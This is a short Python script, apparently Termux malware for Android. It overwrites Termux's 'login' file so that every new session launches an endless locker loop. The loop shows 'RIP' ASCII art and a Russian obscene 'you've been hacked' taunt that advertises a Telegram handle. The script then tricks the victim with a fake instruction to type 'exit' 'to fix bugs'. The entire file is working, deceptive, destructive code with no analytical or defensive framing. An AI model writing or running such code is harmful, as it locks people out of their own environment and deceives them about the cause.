import os

file = open('/data/data/com.termux/files/usr/bin/locker_service.py', 'w')
file.write("""print('''  _____                                     
 RRRRRR.               I              PPPPPP.          
R          R.          I.            P.   P
R          R.          I.            P.   P
R RRRRR.               I.            PPPPPP
RR.                    I.            P
R.  R.                 I.            P
R.     R.              I.            P
R.         R.          I.            P

''')
while True:
	a = input(' Твоя пизда взломана @pkgsearch (telegram)')
""")
file.close()
os.system('chmod +x /data/data/com.termux/files/usr/bin/locker_service.py')

file = open('/data/data/com.termux/files/usr/bin/login', 'w')
file.write('python /data/data/com.termux/files/usr/bin/locker_service.py')
file.close()
print(' Type command -> exit <- to fix bugs')
